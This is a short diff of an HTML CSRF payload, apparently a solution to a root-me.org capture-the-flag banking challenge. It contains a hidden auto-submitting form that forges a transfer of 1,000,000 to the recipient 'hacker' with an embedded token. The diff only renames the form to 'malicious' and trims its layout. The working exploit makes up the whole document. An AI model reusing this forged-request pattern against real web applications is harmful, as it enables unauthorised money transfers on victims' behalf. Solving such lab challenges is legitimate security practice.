@@ -1,14 +1,10 @@
-<form id="transfer-form" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
-   <div class="my-3">
-         <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bDB2ZV8wcmFjbGVfbDRycnk6MTAw">
-         <label for="recipient" class="form-label">Recipient:</label>
-         <input type="text" class="form-control" name="recipient" placeholder="babbz" value="hacker">
-         <label for="amount" class="form-label">Amount:</label>
-         <input type="number" class="form-control" name="amount" min="0" max="1000000" placeholder="1000" value="1000000">
-   </div>
+<form id="malicious" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
+   <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bDB2ZV8wcmFjbGVfbDRycnk6MTAw">
+   <input type="text" class="form-control" name="recipient" placeholder="babbz" value="hacker">
+   <input type="number" class="form-control" name="amount" min="0" max="1000000" placeholder="1000" value="1000000">
    <button type="submit" class="btn btn-rmp btn-rmp-secondary">Send</button>
 </form>
 
 <script>
-   document.getElementById('transfer-form').submit();
+   document.getElementById('malicious').submit();
 </script>
